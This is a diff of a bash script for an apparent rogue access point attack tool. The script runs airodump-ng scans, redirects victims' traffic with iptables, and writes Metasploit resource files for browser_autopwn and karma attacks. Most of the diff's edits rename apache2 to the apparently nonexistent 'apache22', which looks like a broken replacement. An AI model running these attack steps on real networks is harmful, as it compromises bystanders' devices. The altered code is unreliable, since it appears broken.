@@ -415,12 +415,12 @@ initial_scan_fn()
     if [ $initial_scan = "y" ];then
         monscan_start_fn
         
-        Eterm -g 100x20-0-0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0 --scrollbar 0 -q -T "Scan" -e airodump-ng "$monscan" 2> /dev/null &
+        Eterm -g 100x20-0-0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0 --scrollbar 0 -q -T "Scan" -e  airodump-ng "$monscan" 2> /dev/null &
         var=1
         while [[ -n $var ]];do # Clumsy I know. Enter zero's $var, ending the loop
             echo -e "$q\nPress enter to close the scan and continue"
-            read var
-        done
+            read var            
+                    done
         # close airodump before allowing to proceed - prevents later problems with different channels on the same physical device
         killall -9 airodump-ng &> /dev/null # output redirected so not seen in the terminal
         killall -9 Eterm &> /dev/null   # the previous "killall airodump" can leave the eterm open 
@@ -856,13 +856,13 @@ directory_select_fn()
 
 apache_fn()
 {
-    apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data) # check whether apache is running
+    apache=$(ps aux|grep "/usr/sbin/apache22"|grep www-data) # check whether apache is running
     if [[ -z "$apache" ]] ;then                             # if not,
         echo -e "$info\n"
-        service apache2 start
+        service apache22 start
         echo -e "$info"
         sleep 2
-        apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data) # check has successfully started
+        apache=$(ps aux|grep "/usr/sbin/apache22"|grep www-data) # check has successfully started
         if [[ -z "$apache" ]] ;then
             echo -e "$warn\nApache failed to start - please resolve, then try again"
             sleep 4
@@ -962,7 +962,7 @@ dns_fn()
 karmalaunch_fn()
 {
     iptables -t nat -A PREROUTING -i at0 -j REDIRECT
-    service apache2 stop # will interfere with metasploit's server
+    service apache22 stop # will interfere with metasploit's server
     cat /dev/null > /tmp/karma.rc > /dev/null # clear pre-existing karma.rc
     echo "use auxiliary/server/browser_autopwn" > /tmp/karma.rc
     echo "setg AUTOPWN_HOST $ap_ip" >> /tmp/karma.rc
@@ -1044,7 +1044,7 @@ browser_autopwn_fn()
 {
     dns_fn
     iptables -t nat -A PREROUTING -i at0 -j REDIRECT
-    service apache2 stop
+    service apache22 stop
     sleep 0.5
     echo -e "$info\nMetasploit starting..."     
     cat /dev/null > /tmp/br_autopwn.rc > /dev/null # clear pre-existing karma.rc
@@ -1118,7 +1118,7 @@ adv_usage_fn()
             fi
         fi
     fi
-    service apache2 stop &> /dev/null
+    service apache22 stop &> /dev/null
     setup_fn
 }
 
@@ -1812,7 +1812,7 @@ exit_fn()
     rm /tmp/sslstrip &> /dev/null
 
     # rm /var/spool/incron/root &> /dev/null ###
-    service apache2 stop
+    service apache22 stop
     echo -e "\e[40;1;34m"
     service incron stop
     echo "0" > /proc/sys/net/ipv4/ip_forward
